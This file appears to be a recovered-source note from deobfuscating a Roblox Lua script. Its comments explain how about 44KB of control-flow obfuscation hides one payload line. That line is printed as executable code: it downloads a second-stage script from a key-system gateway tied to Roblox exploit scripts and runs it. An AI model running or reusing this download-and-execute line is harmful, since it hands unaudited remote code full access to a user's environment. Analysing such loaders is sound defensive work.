-- Recovered source of original.lua.
--
-- original.lua is a ~44KB custom Lua/Luau VM obfuscator: the whole file is a
-- table of control-flow-flattened "opcode dispatcher" closures (each one a
-- `while true do ... end` state machine driven by a numeric `b` register),
-- plus one short embedded string that is the real payload. That string is
-- decoded at runtime through several chained XOR / bit-shift / base91-ish
-- decode stages before being interpreted as bytecode.
--
-- Running the decoder under a real Lua VM (see tools/) recovers the payload
-- bytes, whose only meaningful string constants are:
--   load, string, game, https://gate.sirius.menu/way?id=sid_ajbys3aqbgr1, Get
--
-- i.e. the ~44KB of obfuscation exists purely to hide this one line:

loadstring(game:HttpGet("https://gate.sirius.menu/way?id=sid_ajbys3aqbgr1"))()

-- "gate.sirius.menu/way?id=sid_ajbys3aqbgr1" is a "Sirius Gateway" key-system
-- checkpoint page (title: "Get your key" / "Checkpoint progress" / "Sirius
-- Developer Platform") -- the kind of leech-protection gate used to monetize
-- free Roblox exploit scripts. game:HttpGet() sends Roblox HttpService
-- headers rather than a browser's, so its actual raw response (the real
-- second-stage script) is not the same as the HTML checkpoint page a normal
-- fetch sees, and was not captured here.
--
-- Net effect: whatever code the key-system server decides to serve for this
-- id runs with full access to the executing script's environment. There is
-- no way to audit that code from this file alone -- treat as untrusted.
